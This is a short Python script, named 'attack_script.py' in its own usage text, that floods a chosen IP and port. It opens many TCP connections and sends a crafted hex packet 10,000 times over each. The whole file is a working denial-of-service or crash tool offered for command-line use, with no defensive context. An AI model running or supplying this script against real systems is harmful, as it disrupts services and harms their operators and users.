import socket
import time
import sys
def main(ip, port, num_connections):
    packet = bytes.fromhex("F10400010900000001000000F2")
    num_send_per_connection = 10000

    for _ in range(num_connections):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.connect((ip, port))
                
                for _ in range(num_send_per_connection):
                    s.sendall(packet)
                
                print(f"Done sending packets to {ip} <3")
            except Exception as e:
                print(f"Error: {e}")

            time.sleep(0)
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python attack_script.py <ip> <port> <num_connections>")
        sys.exit(1)  
    ip = sys.argv[1]
    port = int(sys.argv[2])
    num_connections = int(sys.argv[3])
    main(ip, port, num_connections)
